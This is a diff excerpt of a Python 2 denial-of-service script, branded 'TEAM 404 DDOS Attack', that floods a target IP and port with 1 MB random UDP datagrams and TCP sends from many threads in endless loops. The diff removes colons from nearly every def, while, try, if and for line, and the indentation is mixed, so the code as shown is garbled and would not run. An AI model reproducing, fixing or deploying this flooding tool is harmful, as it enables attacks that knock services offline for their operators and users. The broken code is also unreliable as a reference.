@@ -44,29 +44,29 @@ time.sleep(3)
 print "\033[92m[====================] 100%"
 time.sleep(2)
 os.system ("clear")
-def run():
+def run()
 	data = random._urandom(1000000)
 	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
+	while True
+		try
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			sent = 79
-     while 1:
-        if time.time() > timeout:
+     while 1
+        if time.time() > timeout
             break
-        else:
+        else
             pass
 		 addr = (str(ip),int(port))
-			for x in range(times):
+			for x in range(times)
 				s.sendto(data,addr)
 			print(i +" Sent")
-		except:
+		except
 			print("[!] Error")
-def run2():
+def run2()
 	data = random._urandom(1000000)
 	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
+	while True
+		try
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			
 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -224,12 +224,12 @@ s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 				s.send(data)
 				s.send(data)
 			print(i +" OMO TNEKT!!!")
-			except:
+			except
 			s.close()
 			print("TEAM 404 DDOS Attack " + ip)
 
-for y in range(threads):
-	if choice == "y":
+for y in range(threads)
+	if choice == "y"
 		th = threading.Thread(target = run)
 		th.start()
 	else:
